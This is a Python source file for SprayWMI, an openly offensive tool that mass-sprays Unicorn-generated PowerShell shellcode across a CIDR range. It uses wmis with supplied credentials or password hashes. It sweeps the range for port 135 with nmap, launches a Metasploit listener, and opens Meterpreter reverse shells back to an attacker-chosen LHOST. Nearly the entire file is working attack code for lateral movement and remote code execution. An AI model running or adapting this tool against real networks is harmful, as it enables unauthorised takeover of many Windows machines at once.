#!/usr/bin/python
#
#   __   __   __
# /__` |__) |__)  /\  \ / |  |  |\/| |
# .__/ |    |  \ /~~\  |  |/\|  |  | |
#
#
# Version 0.1
#
# SprayWMI is a method for mass spraying Unicorn PowerShell injection to CIDR notations.
#
# Written by: David Kennedy (@HackingDave) @TrustedSec
# Special thanks to: Justin Elze and Larry Spohn @TrustedSec
#
# Initial blog post: https://www.trustedsec.com/june-2015/no_psexec_needed/
# If you have trouble with this on 64-bit, try:
# dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 libpopt0:i386
#
# Be sure to configure the three options below for Unicorn and WMI paths. This is mandatory or will not work.
# Make sure to close meterpreter properly (exit or kill session) or else the server may spike high CPU - weirdness with PowerShell.
# Configure the path to Unicorn: github.com/trustedsec/unicorn

import subprocess
import os
import sys
import time
definepath = os.getcwd()
os.system('clear')

try: import pexpect
except ImportError:
        print ("[!] python-pexpect not installed, attempting to install it.")
        subprocess.Popen("python -m pip install pexpect", shell=True).wait()
        try: import pexpect
        except ImportError:
                print ("[!] Sorry, could not install pexpect. Try installing it manually: python-pexpect\n\n")
                sys.exit()

unicorn = ("/pentest/post-exploitation/unicorn/")
if not os.path.isdir("/pentest/post-exploitation/unicorn/"):
	if not os.path.isdir(definepath + "/unicorn/"):
		print ("[!] Unicorn not detected, checking out for you automatically.")
		subprocess.Popen("git clone https://github.com/trustedsec/unicorn unicorn/", shell=True).wait()

	unicorn = (definepath + "/unicorn/")
				
wmi = ("./wmis")
if os.path.isfile("wmis"):
	subprocess.Popen("chmod +x wmis", shell=True).wait()
	proc = subprocess.Popen("./wmis", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	if "error while loading shared" in proc.communicate()[1]:
		print ("[!] Looks like you have an issue with wmis - this is most likely because you are on a 64 bit platform and need a couple things first..")
		print ("[!] If on Ubuntu run command to fix: dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 libpopt0:i386")
		sys.exit()

if not os.path.isfile("wmis"):
	print ("[!] WMIS not detected - edit this script to add the full path to WMIS or this will not work.")

# Main variable assignment from command line parameters.
optional = ""
try:

	domain = sys.argv[1]    # Domain you are attacking. If its local, just specify workgroup.
	user = sys.argv[2]      # Username to authenticate on the remote Windows system.
	password = sys.argv[3]  # Password or password hash LM:NTLM to use on the remote Windows system.
	cidr = sys.argv[4]      # CIDR format or a file containing IPs. 
	meta = sys.argv[5]      # Metasploit payload, example: windows/meterpreter/reverse_tcp
	lhost = sys.argv[6]     # Reverse shell IP address (LHOST).
	lport = sys.argv[7]     # Reverse shell listening port (LPORT).
	try:
		if sys.argv[8] == "no": # Optional variable to spawn listener.
			optional = "no"
		else: optional = ""
	except IndexError: pass

# Throw syntax if we don't have all of our sys args taken care of.
except IndexError:
	print (r"""
 __   __   __                        
/__` |__) |__)  /\  \ / |  |  |\/| | 
.__/ |    |  \ /~~\  |  |/\|  |  | | 


	Written by: David Kennedy @ TrustedSec
	
                                     """)
	print ("SprayWMI is a method for mass spraying Unicorn PowerShell injection to CIDR notations.\n")

	print ("""Flags and descriptions:

domain                 Domain you are attacking. If its local, just specify workgroup.
username               Username to authenticate on the remote Windows system.
password               Password or password hash LM:NTLM to use on the remote Windows system.
CIDR range or file     Specify a single IP, CIDR range (10.0.1.1/24) or multiple CIDRs: 10.0.1.1/24,10.0.2.1/24. 
                          You can also specify a file (ex: ips.txt) that contains a single IP addresses on each line. 
payload                Metasploit payload, example: windows/meterpreter/reverse_tcp
LHOST                  Reverse shell IP address.
LPORT                  Reverse shell listening port.
optional: NO           Specify no if you do not want to create a listener. This is useful if you already have a listener 
                          established. If you do not specify a value, it will automatically create a listener for you.
""")
	print ("Usage: python spraywmi.py <domain> <username> <password> <CIDRrange or file> <payload> <LHOST> <LPORT> <optional: no>\n\n")
	sys.exit()

print ("[*] Launching SprayWMI on the hosts specified.")

# Start Unicorn first.
if os.path.isfile(unicorn + "/unicorn.py"):
	os.chdir(unicorn)
	print ("[*] Generating shellcode through Unicorn, this could take a few seconds.")
	subprocess.Popen("python unicorn.py %s %s %s" % (meta, lhost, lport), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	if optional == "":
		print ("[*] Launching the listener in the background.")	
		time.sleep(1)
		child = pexpect.spawn("msfconsole -r %s/unicorn.rc" % (unicorn))
	        print ("[*] Waiting for the listener to start first before we continue.")
	        print ("[*] Be patient, Metasploit takes a little bit to start.")
	        child.expect("Exploit running", timeout=30000)
	unicorn_code = file(unicorn + "/powershell_attack.txt", "r").read()
	# All back to normal.
	os.chdir(definepath)

# If not found, tell them to check it out.
else:
	print ("Unicorn was not found. Please run git clone https://github.com/trustedsec/unicorn, then edit spraywmi.py and point the unicorn = variable to your Unicorn installation.")
	sys.exit()

if not os.path.isfile(cidr):
	# If we have multiple CIDRs, then split them up for nmap.
	if "," in cidr:
		print ("[*] Multiple CIDR notations found, splitting them up.")
		cidr_range = cidr.split(",")
		cidr_temp = ""
		for cidrs in cidr_range:
			cidr_temp = cidr_temp + cidrs + " "
	
		# Our output with spaces.
		cidr = cidr_temp

	# Sweep networks first.
	print ("[*] Sweeping targets for open TCP port 135 first, then moving through. Be patient.")
	subprocess.Popen("nmap -Pn -n --open -p135 -oG - %s | awk '$NF~/msrpc/{print $2}' > openwmi.txt" % (cidr), shell=True).wait()

	# Next we create the WMI command.
	fileopen = file("openwmi.txt", "r").readlines()

# If we are using a file.
if os.path.isfile(cidr):
	fileopen = file(cidr, "r").readlines()

counter = 0
for line in fileopen:
	counter = 1

if counter == 1:
	for ip in fileopen:
		ip = ip.rstrip()
		command = ('''%s -U %s/%s%%%s //%s "%s"''' % (wmi,domain,user,password,ip,unicorn_code))
		print ("[*] Launching WMI spray against IP: %s - You should have a shell in the background. Once finished, a shell will spawn." % (ip))
		proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		stdout_value = proc.communicate()[1]
		if not "Success" in stdout_value: 
			print ("[!] !!!!! WARNING !!!!! - We got something not good from the server.")
			print ("[!] ERROR: Something happened, printing server (%s) response: " % (ip) + stdout_value)

	# Cleanup
	if os.path.isfile("openwmi.txt"):
		os.remove("openwmi.txt")
	# Interact with Metasploit.
	print ("[*] Spraying is still happening in the background, shells should arrive as they complete.")
	
	if optional == "":
		print ("[*] Interacting with Metasploit.")
		# Interact with Metasploit.
		child.interact()
	else:
		print "[*] Running in the background, everything is completed but keeping a loop so subprocess has time to complete.."
		while 1:
			try:
				print "[*] If you are finished, hit control-c to exit."
				time.sleep(15)

			except KeyboardInterrupt:
				print "[*] Exiting SprayWMI.\n\n"
				sys.exit()
else:
	print ("[*] Unable to identify targets with open TCP port 135.\n\n")
	sys.exit()
